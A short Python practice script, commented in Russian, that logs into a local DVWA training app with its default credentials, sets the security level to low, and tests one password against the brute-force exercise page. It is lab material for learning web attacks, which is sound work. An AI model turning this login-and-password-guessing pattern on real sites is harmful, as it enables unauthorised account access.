#!/usr/bin/python3
import requests
import re

print("START")

# 1. Получаем главную страницу и CSRF токен
r = requests.get("http://dvwa.local/login.php")
csrf_match = re.search(r'user_token" value="([^"]+)"', r.text)
if not csrf_match:
    print("ERROR: No CSRF on login page")
    exit()

csrf_token = csrf_match.group(1)
print(f"CSRF: {csrf_token}")

# 2. Логинимся с токеном
s = requests.Session()
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token
}

r = s.post("http://dvwa.local/login.php", data=login_data)
print(f"Login: {r.status_code}")

# 3. Security low
s.post("http://dvwa.local/security.php", 
       data={'security':'low','seclev_submit':'Submit'})

# 4. Пробуем brute force БЕЗ CSRF (на low не нужен)
brute_url = "http://dvwa.local/vulnerabilities/brute/"
test_url = f"{brute_url}?username=admin&password=password&Login=Login"

print(f"\nTesting: {test_url}")
r = s.get(test_url)

# 5. Проверяем
if 'Welcome to the password protected area' in r.text:
    print("SUCCESS! Password 'password' works")
    for line in r.text.split('\n'):
        if 'Welcome' in line:
            print(f"Proof: {line.strip()}")
else:
    print("FAILED")
    print("Response preview:", r.text[:200])
